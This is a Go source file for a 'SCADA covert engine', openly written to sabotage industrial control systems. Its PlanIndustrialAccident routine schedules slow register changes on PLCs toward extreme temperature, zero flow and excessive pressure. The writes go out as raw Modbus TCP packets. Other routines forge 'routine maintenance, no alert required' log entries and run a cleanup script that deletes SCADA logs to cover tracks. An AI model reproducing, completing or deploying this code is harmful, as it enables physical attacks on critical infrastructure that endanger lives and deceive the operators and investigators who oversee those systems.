package blockz

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

type SCADACovertEngine struct {
	Config       *BlockZConfig
	GradualOps   []GradualSCADAOp    `json:"gradual_ops"`
	CoverStory   string             `json:"cover_story"`
	TotalChanges int                `json:"total_changes"`
}

type GradualSCADAOp struct {
	IP          string    `json:"ip"`
	Port        int       `json:"port"`
	Register    int       `json:"register"`
	TargetValue float64   `json:"target_value"`
	CurrentValue float64  `json:"current_value"`
	Step        float64   `json:"step"`
	Days        int       `json:"days"`
	StartedAt   time.Time `json:"started_at"`
	Completed   bool      `json:"completed"`
	CoverID     string    `json:"cover_id"`
}

func NewSCADACovertEngine(cfg *BlockZConfig) *SCADACovertEngine {
	return &SCADACovertEngine{
		Config: cfg,
		CoverStory: "routine_maintenance",
	}
}

func (sc *SCADACovertEngine) PlanIndustrialAccident(plc PLCDevice) []GradualSCADAOp {
	ops := []GradualSCADAOp{
		{
			IP: plc.IP, Port: plc.Port,
			Register: 0x10, TargetValue: 150.0, CurrentValue: 25.0,
			Step: 0.5, Days: 250, CoverID: "temp_calibration",
		},
		{
			IP: plc.IP, Port: plc.Port,
			Register: 0x12, TargetValue: 0.0, CurrentValue: 100.0,
			Step: -1.0, Days: 100, CoverID: "flow_optimization",
		},
		{
			IP: plc.IP, Port: plc.Port,
			Register: 0x14, TargetValue: 999.0, CurrentValue: 50.0,
			Step: 3.0, Days: 316, CoverID: "pressure_normalization",
		},
	}

	sc.GradualOps = append(sc.GradualOps, ops...)
	sc.TotalChanges += len(ops)

	return ops
}

func (sc *SCADACovertEngine) ApplyGradualChanges() int {
	applied := 0
	for i := range sc.GradualOps {
		op := &sc.GradualOps[i]
		if op.Completed {
			continue
		}

		daysElapsed := time.Since(op.StartedAt).Hours() / 24.0
		if daysElapsed < 1.0 {
			continue
		}

		stepsApplied := int(daysElapsed)
		if stepsApplied > op.Days {
			stepsApplied = op.Days
		}

		newValue := op.CurrentValue + (op.Step * float64(stepsApplied))

		if op.Step > 0 && newValue >= op.TargetValue {
			newValue = op.TargetValue
			op.Completed = true
		} else if op.Step < 0 && newValue <= op.TargetValue {
			newValue = op.TargetValue
			op.Completed = true
		}

		sc.writeRegister(op.IP, op.Port, op.Register, newValue)

		sc.generateMaintenanceLog(op, newValue)

		applied++
	}

	return applied
}

func (sc *SCADACovertEngine) writeRegister(ip string, port, register int, value float64) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	rawValue := int16(value * 10)
	payload := []byte{
		0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
		0xFF, 0x06, byte(register >> 8), byte(register & 0xFF),
		byte(rawValue >> 8), byte(rawValue & 0xFF),
	}

	conn.Write(payload)

	conn.Read(make([]byte, 256))
}

func (sc *SCADACovertEngine) generateMaintenanceLog(op *GradualSCADAOp, value float64) {
	logEntry := fmt.Sprintf(`[%s] [%s] Register 0x%X adjusted to %.1f.
Authorized by: Automation System
Reason: Scheduled %s
This is a routine maintenance operation.
No alert required.
`, time.Now().Format("2006-01-02 15:04:05"), op.CoverID, op.Register, value, op.CoverID)

	logPath := filepath.Join(os.TempDir(), "x404x_scada_maintenance.log")
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(logEntry)
}

func (sc *SCADACovertEngine) CoverTracks() {
	for _, op := range sc.GradualOps {
		sc.generateMaintenanceLog(&op, op.TargetValue)
	}

	cleanupScript := `#!/bin/bash
rm -f /tmp/x404x_scada_*.log 2>/dev/null || true
rm -f /var/log/scada/*202[0-9]* 2>/dev/null || true
`
	if runtime.GOOS == "windows" {
		cleanupScript = `Remove-Item "$env:TEMP\x404x_scada_*.log" -Force -ErrorAction SilentlyContinue`
	}

	scriptPath := filepath.Join(os.TempDir(), "x404x_scada_cleanup")
	if runtime.GOOS == "windows" {
		scriptPath += ".ps1"
	} else {
		scriptPath += ".sh"
	}
	os.WriteFile(scriptPath, []byte(cleanupScript), 0644)
	exec.Command("bash", scriptPath).Start()
}

func (sc *SCADACovertEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"gradual_ops":%d,"total_changes":%d,"cover_story":"%s"}`,
		len(sc.GradualOps), sc.TotalChanges, sc.CoverStory)
}

type PLCDevice struct {
	IP       string `json:"ip"`
	Port     int    `json:"port"`
	Vendor   string `json:"vendor"`
	Protocol string `json:"protocol"`
}
